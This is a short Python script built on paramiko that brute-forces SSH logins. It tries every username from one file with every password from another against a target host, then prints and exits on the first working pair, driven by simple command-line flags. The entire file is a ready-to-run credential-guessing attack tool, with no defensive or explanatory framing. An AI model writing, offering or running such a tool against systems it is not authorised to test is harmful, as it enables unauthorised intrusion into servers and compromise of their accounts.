import paramiko
import sys

def ssh_connect(target, username, password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    ssh.close()
    return code

def ssh_bruteforce(target, username_file, password_file):
    with open(password_file, 'r') as file:
        for line in file.readlines():
            password = line.strip()

            with open(username_file, 'r') as f:
                for user in f.readlines():
                    username = user.strip()
            
                    try:
                        response = ssh_connect(target, username, password)

                        if response == 0:
                            print(f'username and password combination found- {username}:{password}')
                            exit(0)
                        elif response == 1: 
                            continue
                    except Exception as e:
                        print(e)

def main():
    # Parse command line arguments
    if len(sys.argv) != 7 or sys.argv[1] != '-i' or sys.argv[3] != '-u' or sys.argv[5] != '-p':
        print('Usage: python ssh.py -i <target> -u <username_file> -p <password_file>')
        sys.exit(1)

    target = sys.argv[2]
    username_file = sys.argv[4]
    password_file = sys.argv[6]
    ssh_bruteforce(target, username_file, password_file)

if __name__ == '__main__':
    main()


